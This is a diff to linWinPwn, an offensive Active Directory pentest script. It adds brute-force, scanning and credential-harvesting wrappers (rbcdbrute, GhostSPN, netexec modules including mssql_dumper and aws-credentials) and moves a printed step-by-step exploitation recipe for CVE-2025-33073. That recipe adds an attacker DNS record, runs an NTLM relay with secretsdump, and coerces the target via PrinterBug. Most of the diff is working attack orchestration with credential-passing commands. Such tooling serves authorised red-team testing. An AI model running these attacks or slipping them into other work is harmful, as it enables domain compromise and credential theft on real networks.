@@ -172,6 +172,8 @@ adpulse="$scripts_dir/ADPulse-main/ADPulse.py"
 powerview_py=$(command -v powerview)
 evil_winrm_py=$(command -v evil-winrm-py)
 krbrelayx_addspn="$scripts_dir/krbrelayx-master/addspn.py"
+rbcdbrute="$scripts_dir/rbcdbrute.py"
+ghostspn="$scripts_dir/GhostSPN.py"
 
 print_banner() {
     echo -e "
@@ -181,7 +183,7 @@ print_banner() {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 1.4.11 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 1.4.12 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -793,6 +795,7 @@ authenticate() {
             argument_gpb="-d ${dc_domain}"
             argument_rking="--null-auth"
             argument_powerview_py="'':''"
+            argument_ghostspn=""
             auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}null session ${NC}"
         fi
 
@@ -861,6 +864,8 @@ authenticate() {
         argument_adpulse="--user '${user}' --password '${password}' --domain ${domain}"
         argument_powerview_py="'${domain}/${user}':'${password}'"
         argument_evil_winrm_py="-u '${user}' -p '${password}'"
+        argument_ghostspn="-u '${user}' -d ${domain} -p '${password}'"
+        argument_rbcdbrute="${domain}/${user}:${password}"
         auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}password of ${user}${NC}"
     fi
 
@@ -937,7 +942,9 @@ authenticate() {
             argument_adwsdomaindump="-u '${domain}\\${user}' -p '${hash}'"
             argument_adpulse="--user '${user}' --hash '${hash}' --domain ${domain}"
             argument_powerview_py=" -H ${hash} '${domain}/${user}'"
-            argument_evil_winrm_py="-u '${user}' -H ${hash:33}                          "
+            argument_evil_winrm_py="-u '${user}' -H ${hash:33}"
+            argument_ghostspn="-u '${user}' -d ${domain} --hashes ${hash}"
+            argument_rbcdbrute="-hashes ${hash} ${domain}/${user}"
         else
             echo -e "${RED}[i]${NC} Incorrect format of NTLM hash..."
             exit 1
@@ -1000,6 +1007,7 @@ authenticate() {
             argument_pyadrecon="-d ${domain} -u '${user}' --auth kerberos --tgt-file '${krb5cc}'"
             argument_pyadrecon_adws="-d ${domain} -u '${user}' --auth kerberos"
             argument_powerview_py="-k --no-pass '${domain}/${user}'"
+            argument_rbcdbrute="-k -no-pass ${domain}/${user}"
             auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}Kerberos Ticket of $user located at $(realpath "$krb5cc")${NC}"
         else
             echo -e "${RED}[i]${NC} Error accessing provided Kerberos ticket $(realpath "$krb5cc")..."
@@ -1034,6 +1042,7 @@ authenticate() {
         argument_daclsearch="-l ${domain} -u '${user}' --aeskey ${aeskey} -k"
         argument_rking="-d ${domain} -u '${user}' --aesKey ${aeskey} -k"
         argument_powerview_py="--aes-key ${aeskey} '${domain}/${user}'"
+        argument_rbcdbrute="-aesKey ${aeskey} ${domain}/${user}"
         auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}AES Kerberos key of ${user}${NC}"
     fi
 
@@ -1147,6 +1156,8 @@ authenticate() {
         argument_spearspray="${argument_spearspray} --debug"
         argument_gpb="${argument_gpb} -v"
         argument_rking="${argument_rking} -v"
+        argument_ghostspn="-v --debug ${argument_ghostspn}"
+        argument_rbcdbrute="-v -debug ${argument_rbcdbrute}"
     fi
 
     echo -e "${auth_string}"
@@ -1533,6 +1544,9 @@ ne_ldap_enum() {
     echo -e ""
     echo -e "${BLUE}[*] Password Policy${NC}"
     run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} --pass-pol --kdcHost ${dc_FQDN} --log ${DomainRecon_dir}/ne_ldappasspol_output_${dc_domain}.txt" 2>&1
+    echo -e ""
+    echo -e "${BLUE}[*] Entra ID Sync Server${NC}"
+    run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} --entra-id-sync --kdcHost ${dc_FQDN} --log ${DomainRecon_dir}/ne_entra_id_sync_output_${dc_domain}.txt" 2>&1
     echo -e ""
 }
 
@@ -2188,6 +2202,27 @@ powerview_py_console() {
     echo -e ""
 }
 
+ghostspn_enum() {
+    if ! stat "${ghostspn}" >/dev/null 2>&1; then
+        echo -e "${RED}[-] Please verify the installation of GhostSPN${NC}"
+    else
+        if [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ] || [ "${cert_bool}" == true ]; then
+            echo -e "${PURPLE}[-] GhostSPN does not support Kerberos or AES Key or Certificate authentication${NC}"
+        else
+            echo -e "${BLUE}[*] Running GhostSPN scan${NC}"
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="--ldaps"; else ldaps_param=""; fi
+            run_command "${python3} ${ghostspn} scan ${argument_ghostspn} --dc-ip ${dc_ip} ${ldaps_param}" 2>&1 | tee -a "${DomainRecon_dir}/ghostspn_output_${dc_domain}.txt"
+        fi
+    fi
+    echo -e ""
+}
+
+ne_dns_nonsecure() {
+    echo -e "${BLUE}[*] Checking DNS zones allowing nonsecure dynamic updates using netexec${NC}"
+    run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} -M dns-nonsecure --kdcHost ${dc_FQDN} --log ${DomainRecon_dir}/ne_dns-nonsecure_output_${dc_domain}.txt" 2>&1
+    echo -e ""
+}
+
 ###### adcs_enum: ADCS Enumeration
 ne_adcs_enum() {
     mkdir -p "${ADCS_dir}"
@@ -2246,6 +2281,7 @@ certipy_enum() {
             if [ "${ldapbind_bool}" == true ]; then ldapbind_param=""; else ldapbind_param="-no-ldap-channel-binding"; fi
             if [ "${dnstcp_bool}" == true ]; then dnstcp_param="-dns-tcp "; else dnstcp_param=""; fi
             run_command "${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dns_ip} ${dnstcp_param} ${ldaps_param} ${ldapsign_param} ${ldapbind_param} -stdout"  | tee "${ADCS_dir}/certipy_output_${user_var}.txt"
+            #run_command "${netexec} ${ne_verbose} ldap ${curr_targets_list} "${argument_ne}" -M certipy-find --log ${ADCS_dir}/certipy_netexec_output_${dc_domain}.txt"
             run_command "${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dns_ip} ${dnstcp_param} ${ldaps_param} ${ldapsign_param} ${ldapbind_param} -vulnerable -json -output vuln_${dc_domain} -stdout -hide-admins" 2>&1 | tee -a "${ADCS_dir}/certipy_vulnerable_output_${user_var}.txt"
             cd "${current_dir}" || exit
         fi
@@ -2708,6 +2744,12 @@ gpb_enum() {
     echo -e ""
 }
 
+gpp_priv_enum() {
+    echo -e "${BLUE}[*] GPP Privileges Enumeration${NC}"
+    run_command "${netexec} ${ne_verbose} smb ${target} ${argument_ne} -M gpp_privileges --log ${GPO_dir}/ne_gpp_priv_output_${dc_domain}.txt" 2>&1
+    echo -e ""
+}
+
 ###### bruteforce: Brute Force attacks
 ridbrute_attack() {
     if [ "${nullsess_bool}" == true ]; then
@@ -2941,6 +2983,62 @@ spearspray_console() {
     echo -e ""
 }
 
+rbcdbrute_attack() {
+    if ! stat "${rbcdbrute}" >/dev/null 2>&1; then
+        echo -e "${RED}[-] Please verify the installation of rbcdbrute${NC}"
+    else
+        if [ "${nullsess_bool}" == true ] || [ "${cert_bool}" == true ]; then
+            echo -e "${PURPLE}[-] rbcdbrute requires credentials and does not support certificate authentication${NC}"
+        else
+            echo -e "${YELLOW}[!] rbcdbrute requires RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity) to already be set for the current user.${NC}"
+            echo -e "${CYAN}[*] Has RBCD already been set up? (y/N)${NC}"
+            rbcd_setup_confirm=""
+            read -rp ">> " rbcd_setup_confirm </dev/tty
+            if [[ ! "${rbcd_setup_confirm}" =~ ^[Yy]$ ]]; then
+                echo -e "${RED}[-] Please set up RBCD first using the Modification menu${NC}"
+                return 1
+            fi
+
+            echo -e "${BLUE}[*] Running rbcdbrute (RBCD local-admin discovery)${NC}"
+            echo -e "${CYAN}[*] Please specify target machine account:${NC}"
+            echo -e "${CYAN}[*] Example: WK01 or DC01${NC}"
+            rbcd_target=""
+            read -rp ">> " rbcd_target </dev/tty
+            while [ "${rbcd_target}" == "" ]; do
+                echo -e "${RED}Invalid target.${NC} Please specify target machine account:"
+                read -rp ">> " rbcd_target </dev/tty
+            done
+
+            rbcd_u2u=""
+            if [[ ! "${user}" == *\$ ]]; then
+                echo -e "${YELLOW}[i] Current user does not look like a machine account (no trailing \$), checking if it is SPN-less...${NC}"
+                if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
+                rbcd_spn_check=$(${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get object "${user}" --attr servicePrincipalName 2>/dev/null)
+                if echo "${rbcd_spn_check}" | grep -qi "servicePrincipalName"; then
+                    echo -e "${YELLOW}[i] Current user ${user} has SPN(s) set, not SPN-less. U2U (-u2u) is not required.${NC}"
+                else
+                    echo -e "${YELLOW}[i] Current user ${user} is SPN-less.${NC}"
+                    if [ "${kerb_bool}" == true ]; then
+                        rbcd_u2u="-u2u"
+                        echo -e "${YELLOW}[i] Using U2U (-u2u) for SPN-less controlled account ${user} with the provided ccache TGT.${NC}"
+                    else
+                        echo -e "${RED}[-] SPN-less accounts require a Kerberos authentication with the current user.${NC}"
+                        return 1
+                    fi
+                fi
+            fi
+            rbcd_users_file="${users_list}"
+            if [ ! -s "${rbcd_users_file}" ]; then
+                echo -e "${YELLOW}[i] No enumerated users found. Using $user_wordlist wordlist for user enumeration. This may take a while...${NC}"
+                rbcd_users_file="${user_wordlist}"
+            fi
+
+            run_command "${python3} ${rbcdbrute} ${argument_rbcdbrute} -target '${rbcd_target}' -users '${rbcd_users_file}' -dc-ip ${dc_ip} ${rbcd_u2u}" 2>&1 | tee -a "${BruteForce_dir}/rbcdbrute_output_${dc_domain}.txt"
+        fi
+    fi
+    echo -e ""
+}
+
 ###### kerberos: Kerberos attacks
 asrep_attack() {
     if ! stat "${impacket_GetNPUsers}" >/dev/null 2>&1; then
@@ -2959,7 +3057,7 @@ asrep_attack() {
         else
             run_command "${impacket_GetNPUsers} ${argument_imp} -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS}"
             run_command "${impacket_GetNPUsers} ${argument_imp} -request -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS}" >"${Kerberos_dir}/asreproast_output_${dc_domain}.txt"
-            #${netexec} ${ne_verbose} smb ${curr_targets_list} "${argument_ne}" --asreproast --log ${Kerberos_dir}/asreproast_output_${dc_domain}.txt" 2>&1
+            #run_command "${netexec} ${ne_verbose} smb ${curr_targets_list} ${argument_ne} --asreproast --log ${Kerberos_dir}/asreproast_output_${dc_domain}.txt"
         fi
         if grep -q 'error' "${Kerberos_dir}/asreproast_output_${dc_domain}.txt"; then
             echo -e "${RED}[-] Errors during AS REP Roasting Attack... ${NC}"
@@ -3045,7 +3143,7 @@ kerberoast_attack() {
             echo -e "${BLUE}[*] Kerberoast Attack${NC}"
             run_command "${impacket_GetUserSPNs} ${argument_imp} -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS} -target-domain ${dc_domain}" | tee "${Kerberos_dir}/kerberoast_list_output_${dc_domain}.txt"
             run_command "${impacket_GetUserSPNs} ${argument_imp} -request -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS} -target-domain ${dc_domain}" >"${Kerberos_dir}/kerberoast_output_${dc_domain}.txt"
-            #${netexec} ${ne_verbose} smb ${curr_targets_list} "${argument_ne}" --kerberoasting --log ${Kerberos_dir}/kerberoast_output_${dc_domain}.txt" 2>&1
+            #run_command "${netexec} ${ne_verbose} smb ${curr_targets_list} ${argument_ne} --kerberoasting --log ${Kerberos_dir}/kerberoast_output_${dc_domain}.txt"
             if grep -q 'error' "${Kerberos_dir}/kerberoast_output_${dc_domain}.txt"; then
                 echo -e "${RED}[-] Errors during Kerberoast Attack... ${NC}"
             elif [ "${noexec_bool}" == "false" ]; then
@@ -3153,6 +3251,7 @@ raise_child() {
     else
         echo -e "${BLUE}[*] Running privilege escalation from Child Domain to Parent Domain using raiseChild${NC}"
         run_command "${impacket_raiseChild} ${argument_imp} -w ${Credentials_dir}/raiseChild_ccache_${user_var}.txt" 2>&1 | tee -a "${Kerberos_dir}/impacket_raiseChild_output.txt"
+        #run_command "${netexec} ${ne_verbose} ldap ${domain} ${argument_ne} --raisechild --log ${Kerberos_dir}/netexec_raiseChild_output.txt"
     fi
     echo -e ""
 }
@@ -3480,16 +3579,6 @@ coerceplus_check() {
     local dnsrecord_type_opt=""
     echo -e "${BLUE}[*] coerce check ${NC}"
     run_command "${netexec} ${ne_verbose} smb ${curr_targets_list} ${argument_ne} -M coerce_plus --log ${Vulnerabilities_dir}/ne_coerce_output_${dc_domain}.txt" 2>&1
-    if grep -q "VULNERABLE" "${Vulnerabilities_dir}/ne_coerce_output_${dc_domain}.txt"; then
-        if [[ "${attacker_IP}" == *:* ]]; then dnsrecord_type_opt="--dnstype AAAA"; fi
-        echo -e "${GREEN}[+] Target(s) vulnerable to coercing found! Consider checking for CVE-2025-33073 (https://github.com/mverschu/CVE-2025-33073). Follow steps below for exploitation:${NC}" | tee -a "${Vulnerabilities_dir}/CVE_2025_33073_exploitation_steps_${dc_domain}.txt"
-        echo -e "${CYAN}1. Add DNS record pointing to the attacker machine:${NC}" | tee -a "${Vulnerabilities_dir}/CVE_2025_33073_exploitation_steps_${dc_domain}.txt"
-        echo -e "${bloodyad} ${argument_bloodyad} --host ${dc_FQDN} --dc-ip ${dc_ip} --dns ${dns_ip} add dnsRecord ${dnsrecord_type_opt} localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA ${attacker_IP}" | tee -a "${Vulnerabilities_dir}/CVE_2025_33073_exploitation_steps_${dc_domain}.txt"
-        echo -e "${CYAN}2. Use ntlmrelayx to run a listener and execute secretdump:${NC}" | tee -a "${Vulnerabilities_dir}/CVE_2025_33073_exploitation_steps_${dc_domain}.txt"
-        echo -e "ntlmrelayx.py -t smb://[ TARGET ] -smb2support" | tee -a "${Vulnerabilities_dir}/CVE_2025_33073_exploitation_steps_${dc_domain}.txt"
-        echo -e "${CYAN}3. Coerce the target machine to connect back to your attacker machine:${NC}" | tee -a "${Vulnerabilities_dir}/CVE_2025_33073_exploitation_steps_${dc_domain}.txt"
-        echo -e "${netexec} ${ne_verbose} smb [ TARGET ] ${argument_ne} -M coerce_plus -o M=PrinterBug L=localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA" | tee -a "${Vulnerabilities_dir}/CVE_2025_33073_exploitation_steps_${dc_domain}.txt"
-    fi
     echo -e ""
 }
 
@@ -3729,6 +3818,23 @@ onelogon_check() {
     echo -e ""
 }
 
+netexec_enum_cve() {
+    echo -e "${BLUE}[*] Enumeration of vulnerable CVEs ${NC}"
+    run_command "${netexec} ${ne_verbose} smb ${target_dc} ${argument_ne} -M enum_cve --log ${Vulnerabilities_dir}/ne_enum_cve_output_${dc_domain}.txt" 2>&1
+    if grep -q "CVE-2025-33073" "${Vulnerabilities_dir}/ne_enum_cve_output_${dc_domain}.txt"; then
+        if [[ "${attacker_IP}" == *:* ]]; then dnsrecord_type_opt="--dnstype AAAA"; fi
+        echo -e "${GREEN}[+] Target(s) potentially vulnerable to CVE-2025-33073 (https://github.com/mverschu/CVE-2025-33073). Follow steps below for exploitation:${NC}" | tee -a "${Vulnerabilities_dir}/CVE_2025_33073_exploitation_steps_${dc_domain}.txt"
+        echo -e "${CYAN}1. Add DNS record pointing to the attacker machine:${NC}" | tee -a "${Vulnerabilities_dir}/CVE_2025_33073_exploitation_steps_${dc_domain}.txt"
+        echo -e "${bloodyad} ${argument_bloodyad} --host ${dc_FQDN} --dc-ip ${dc_ip} --dns ${dns_ip} add dnsRecord ${dnsrecord_type_opt} localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA ${attacker_IP}" | tee -a "${Vulnerabilities_dir}/CVE_2025_33073_exploitation_steps_${dc_domain}.txt"
+        echo -e "${CYAN}2. Use ntlmrelayx to run a listener and execute secretdump:${NC}" | tee -a "${Vulnerabilities_dir}/CVE_2025_33073_exploitation_steps_${dc_domain}.txt"
+        echo -e "ntlmrelayx.py -t smb://[ TARGET ] -smb2support" | tee -a "${Vulnerabilities_dir}/CVE_2025_33073_exploitation_steps_${dc_domain}.txt"
+        echo -e "${CYAN}3. Coerce the target machine to connect back to your attacker machine:${NC}" | tee -a "${Vulnerabilities_dir}/CVE_2025_33073_exploitation_steps_${dc_domain}.txt"
+        echo -e "${netexec} ${ne_verbose} smb [ TARGET ] ${argument_ne} -M coerce_plus -o M=PrinterBug L=localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA" | tee -a "${Vulnerabilities_dir}/CVE_2025_33073_exploitation_steps_${dc_domain}.txt"
+    fi
+    echo -e ""
+}
+
+
 ###### mssql_checks: MSSQL scan
 mssql_enum() {
     if ! stat "${windapsearch}" >/dev/null 2>&1 || ! stat "${impacket_GetUserSPNs}" >/dev/null 2>&1; then
@@ -3749,6 +3855,7 @@ mssql_enum() {
             run_command "${netexec} ${ne_verbose} mssql ${curr_targets_list_sql} ${argument_ne} -M enum_impersonate --log ${MSSQL_dir}/ne_mssql_output_${user_var}.txt" 2>&1
             run_command "${netexec} ${ne_verbose} mssql ${curr_targets_list_sql} ${argument_ne} -M enum_logins --log ${MSSQL_dir}/ne_mssql_output_${user_var}.txt" 2>&1
             run_command "${netexec} ${ne_verbose} mssql ${curr_targets_list_sql} ${argument_ne} -M enum_links --log ${MSSQL_dir}/ne_mssql_output_${user_var}.txt" 2>&1
+            run_command "${netexec} ${ne_verbose} mssql ${curr_targets_list_sql} ${argument_ne} -M mssql_dumper --log ${MSSQL_dir}/ne_mssql_output_${user_var}.txt" 2>&1
         else
             echo -e "${PURPLE}[-] No SQL servers found! Please re-run SQL enumeration and try again..${NC}"
         fi
@@ -3874,6 +3981,7 @@ change_pass() {
             if [[ ${pass_passchange} == "" ]]; then pass_passchange="Summer3000_"; fi
             echo -e "${CYAN}[*] Changing password of ${target_passchange} to ${pass_passchange}${NC}"
             run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} set password '${target_passchange}' '${pass_passchange}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_passchange_${dc_domain}.txt"
+            #run_command "${netexec} ${ne_verbose} smb ${target_dc} ${argument_ne} -M change-password -o NEWPASS=${pass_passchange} USER=${target_passchange} --log ${Modification_dir}/ne_setpass_output_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -3952,6 +4060,7 @@ add_computer() {
             if [[ ${pass_addcomp} == "" ]]; then pass_addcomp="Summer3000_"; fi
             echo -e "${CYAN}[*] Creating computer ${host_addcomp} with password ${pass_addcomp}${NC}"
             run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add computer '${host_addcomp}' '${pass_addcomp}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_addcomp_${dc_domain}.txt"
+            #run_command "${netexec} ${ne_verbose} smb ${dc_ip} ${argument_ne} -M add_computer -o NAME=${host_addcomp} PASSWORD=${pass_addcomp} --log ${Modification_dir}/ne_addcomp_output_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -4427,6 +4536,7 @@ rbcd_attack() {
             if grep -q "can now impersonate users" "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_rbcd_${dc_domain}.txt"; then
                 echo -e "${GREEN}[+] RBCD Attack successful! Run option Kerberos/18 or the command below to generate ticket${NC}"
                 echo -e "${impacket_getST} -spn 'cifs/${target_rbcd}.${domain}' -impersonate Administrator -dc-ip ${dc_ip} '${domain}/${service_rbcd}:<PASSWORD>'"
+                echo -e ""
                 echo -e "${CYAN}[!] Run command below to remove impersonation rights:${NC}"
                 echo -e "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} remove rbcd '${target_rbcd}$' '${service_rbcd}'"
             fi
@@ -4495,6 +4605,7 @@ rbcd_spnless_attack() {
                         else
                             echo -e "${RED}[-] Generation of ticket impersonating Administrator failed!${NC}"
                         fi
+                        echo -e ""
                         echo -e "${CYAN}[!] Run command below to reset password of ${user_spnless}:${NC}"
                         echo -e "${impacket_changepasswd} ${domain}/${user_spnless}@${dc_ip} -hashes :${ticketsesskey} -newpass <NEW PASSWORD>"
                         echo -e "${CYAN}[!] Run command below to remove impersonation rights:${NC}"
@@ -4962,7 +5073,7 @@ juicycreds_dump() {
     echo -e "${BLUE}[*] Search for juicy credentials: Firefox, KeePass, Rdcman, Teams, WiFi, WinScp${NC}"
     for i in $(/bin/cat "${curr_targets_list}"); do
         echo -e "${CYAN}[*] Searching in ${i} ${NC}"
-        run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M keepass_discover -M rdcman -M teams_localdb -M wifi -M winscp -M snipped -M powershell_history -M mremoteng -M iis -M vnc -M eventlog_creds -M notepad++ -M notepad --log ${Credentials_dir}/keepass_discover_${user_var}_${i}.txt" 2>&1
+        run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M keepass_discover -M rdcman -M teams_localdb -M wifi -M winscp -M snipped -M powershell_history -M mremoteng -M iis -M vnc -M eventlog_creds -M notepad++ -M notepad -M aws-credentials --log ${Credentials_dir}/keepass_discover_${user_var}_${i}.txt" 2>&1
     done
     echo -e ""
 }
@@ -5234,6 +5345,7 @@ bitlocker_dump() {
         else
             if [ "${verbose_bool}" == true ]; then verbose_p0dalirius="-v"; else verbose_p0dalirius=""; fi
             run_command "${python3} ${ExtractBitlockerKeys} ${argument_p0dalirius} ${ldaps_param} ${verbose_p0dalirius} --kdcHost ${dc_FQDN} --dc-ip ${dc_ip}" 2>&1 | tee "${Credentials_dir}/bitlockerdump_${user_var}_output_${dc_domain}.txt"
+            #run_command "${netexec} ${ne_verbose} smb --port ${ldap_port} ${target} ${argument_ne} -M bitlocker --kdcHost ${dc_FQDN} --log ${Credentials_dir}/bitlockerdump_${user_var}_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -5879,6 +5991,8 @@ ad_menu() {
     check_tool_status "${pyadrecon_adws}" "PyADRecon ADWS Enumeration" "34"
     check_tool_status "${adpulse}" "Run ADPulse Checks" "35"
     check_tool_status "${powerview_py}" "Open PowerView.py Console" "36"
+    check_tool_status "${ghostspn}" "Scan for GhostSPN" "37"
+    check_tool_status "${netexec}" "Check DNS zones allowing nonsecure dynamic updates using netexec" "38"
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
@@ -6080,6 +6194,16 @@ ad_menu() {
         ad_menu
         ;;
 
+    37)
+        ghostspn_enum
+        ad_menu
+        ;;
+
+    38)
+        ne_dns_nonsecure
+        ad_menu
+        ;;
+
     back)
         main_menu
         ;;
@@ -6254,6 +6378,7 @@ gpo_menu() {
     check_tool_status "${GPOwned}" "GPO Enumeration using GPOwned" "2"
     check_tool_status "${gpoParser}" "GPOParser Enumeration" "3"
     check_tool_status "${GroupPolicyBackdoor}" "GroupPolicyBackdoor Enumeration" "4"
+    check_tool_status "${netexec}" "GPP Privilege Enumeration using netexec" "5"
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
@@ -6282,6 +6407,11 @@ gpo_menu() {
 
     4)
         gpb_enum
+        gpo_menu
+        ;;
+
+    5) 
+        gpp_priv_enum
         gpo_menu
         ;;
 
@@ -6323,6 +6453,7 @@ bruteforce_menu() {
     check_tool_status "${netexec}" "Timeroast attack against NTP" "10"
     check_tool_status "${netexec}" "MSSQL RID Brute Force (Null session) using netexec" "11"
     check_tool_status "${spearspray}" "Open SpearSpray console" "12"
+    check_tool_status "${rbcdbrute}" "Run rbcdbrute attack (Requires RBCD already set up) (Noisy!)" "13"
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
@@ -6391,6 +6522,11 @@ bruteforce_menu() {
 
     12)
         spearspray_console
+        bruteforce_menu
+        ;;
+
+    13)
+        rbcdbrute_attack
         bruteforce_menu
         ;;
 
@@ -7102,6 +7238,7 @@ vulns_menu() {
     check_tool_status "${relayking}" "RelayKing Coerce scan" "17"
     check_tool_status "${netexec}" "Drop LNK, Library-MS and SC (on writeable share)" "18"
     check_tool_status "${netexec}" "onelogon check using netexec (only on DC)" "19"
+    check_tool_status "${netexec}" "Enumerate common (useful) CVEs using netexec" "20"
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
@@ -7210,6 +7347,11 @@ vulns_menu() {
 
     19)
         onelogon_check
+        vulns_menu
+        ;;
+
+    20)
+        netexec_enum_cve
         vulns_menu
         ;;
 
@@ -8149,6 +8291,8 @@ config_menu() {
         if ! stat "${adpulse}" >/dev/null 2>&1; then echo -e "${RED}[-] ADPulse is not installed${NC}"; else echo -e "${GREEN}[+] ADPulse is installed${NC}"; fi
         if ! stat "${powerview_py}" >/dev/null 2>&1; then echo -e "${RED}[-] PowerView.py is not installed${NC}"; else echo -e "${GREEN}[+] PowerView.py is installed${NC}"; fi
         if ! stat "${evil_winrm_py}" >/dev/null 2>&1; then echo -e "${RED}[-] evil-winrm-py is not installed${NC}"; else echo -e "${GREEN}[+] evil-winrm-py is installed${NC}"; fi
+        if ! stat "${ghostspn}" >/dev/null 2>&1; then echo -e "${RED}[-] GhostSPN is not installed${NC}"; else echo -e "${GREEN}[+] GhostSPN is installed${NC}"; fi
+        if ! stat "${rbcdbrute}" >/dev/null 2>&1; then echo -e "${RED}[-] RBCDBrute is not installed${NC}"; else echo -e "${GREEN}[+] RBCDBrute is installed${NC}"; fi
         config_menu
         ;;
 
